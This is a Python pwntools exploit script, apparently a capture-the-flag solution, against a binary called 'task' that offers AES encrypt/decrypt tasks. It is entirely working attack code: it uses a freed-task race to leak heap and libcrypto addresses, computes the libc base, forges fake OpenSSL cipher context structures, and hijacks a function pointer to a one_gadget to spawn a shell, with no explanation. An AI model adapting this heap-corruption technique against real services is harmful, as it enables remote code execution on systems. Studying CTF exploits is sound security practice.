#!/usr/bin/env python2
#-*- coding: utf-8 -*-

from pwn import *
from Crypto.Cipher import AES
from hexdump import hexdump
import time, sys, os, copy

env = copy.deepcopy(os.environ)
#env["LD_PRELOAD"] = "./libcrypto.so.1.0.0"

p = process("./task", env=env)
#p = gdb.debug("./task")
#p = remote('111.186.63.201', 10001)
#context.log_level = 'DEBUG'
#gdb.attach(p)

def add(tid, enc, key, iv, data, deferred=False):
 p.sendlineafter("Choice: ", "1")
 p.sendlineafter("Task id : ", str(tid))
 p.sendlineafter("Encrypt(1) / Decrypt(2): ", str(enc))
 p.sendafter("Key : ", key)
 p.sendafter("IV : ", iv)
 p.sendlineafter("Data Size : ", str(len(data)))
 p.recvuntil('Data : ')
 if deferred:
   time.sleep(3)
 p.send(data)
 return

def remove(tid):
 p.sendlineafter("Choice: ", "2")
 p.sendlineafter("Task id : ", str(tid))
 return

def go(tid):
 p.sendlineafter("Choice: ", "3")
 p.sendlineafter("Task id : ", str(tid))
 return

dehex = lambda x: x.replace(' ', '').replace('\n', '').decode('hex')

KEY = 'a' * 32
IV = 'b' * 16
EVP_CIPHER_CTX_size = 0xa0
TASK_size = 0x70
#getenv_offset = 0x000000000003b610
getenv_offset = 0x00000000000426e0

def read_ct(size):
 lines = size / 0x10
 if size % 0x10 != 0:
   lines += 1
 p.recvuntil('Ciphertext: \n')
 data = ''
 for _ in xrange(lines):
   data += p.recvline()
 data = dehex(data)

 cipher = AES.new(KEY, mode=AES.MODE_CBC, IV=IV)
 dec = cipher.decrypt(data)
 hexdump(dec)
 return dec

# leak heap address (by task)
add(0x1337, 1, KEY, IV, "123123")
add(0x1338, 1, KEY, IV, "123123")
go(0x1337)
remove(0x1338)
remove(0x1337)
# gdb.attach(p)
add(0x1337, 1, KEY, IV, TASK_size * 'c', True)

leaked = read_ct(TASK_size)

heap_base = u64(leaked[0x58:0x60]) - 0x1560
log.info("Heap base = " + hex(heap_base))
add(0x1338, 1, KEY, IV, "123123")
add(0x1339, 1, KEY, IV, "123123")

# leak lib address
add(0x2, 1, KEY, IV, "123123")
add(0x3, 1, KEY, IV, "123123")
cipher = heap_base + 0x1960
fake_task = p64(cipher) + p64(EVP_CIPHER_CTX_size) + p32(1) + KEY + IV + 20 * '\x00' + p64(cipher) + p64(0x1111) + p64(0)
go(0x3)
remove(0x3)
remove(0x2)
add(0x2, 1, KEY, IV, fake_task)
add(0x9, 1, KEY, IV, "123123", True)
leaked = read_ct(EVP_CIPHER_CTX_size)
libcrypto_addr = u64(leaked[0:8]) - 0x425620
log.info("libcrypto = " + hex(libcrypto_addr))
add(0x10, 1, KEY, IV, "123123")
add(0x11, 1, KEY, IV, "123123")

# by offset2lib
offset2lib = 0x3f1000
libc_addr = libcrypto_addr - offset2lib
log.info("libc = " + hex(libc_addr))

# solve
one_gadget = libc_addr + 0x10a38c
fake_cipher = p32(0) * 4 + p32(0) + p32(0) + p64(0) + p64(one_gadget) + p64(0) + p32(0) + p32(0) + 'p' * 32
add(0x111, 1, KEY, IV, fake_cipher)
fake_cipher_addr = heap_base + 0x2860
fake_ctx = p64(fake_cipher_addr) + p64(0) + p32(1) + p32(0) + 'a' * 16 + 'b' * 16 + 'c' * 32 + p32(4) + p32(0) + p64(0) + p32(0) + p32(0) + p64(0) + p32(0) + p32(0) + 'd' * 32
assert len(fake_ctx) == EVP_CIPHER_CTX_size
add(0x112, 1, KEY, IV, fake_ctx)
fake_ctx_addr = heap_base + 0x2b00
fake_task = p64(fake_cipher_addr) + p64(0x10) + p32(1) + KEY + IV + 20 * '\x00' + p64(fake_ctx_addr) + p64(0x1111) + p64(0)
add(0x51, 1, KEY, IV, "123123")
add(0x52, 1, KEY, IV, "123123")
go(0x52)
remove(0x52)
remove(0x51)
add(0x51, 1, KEY, IV, fake_task)

p.interactive()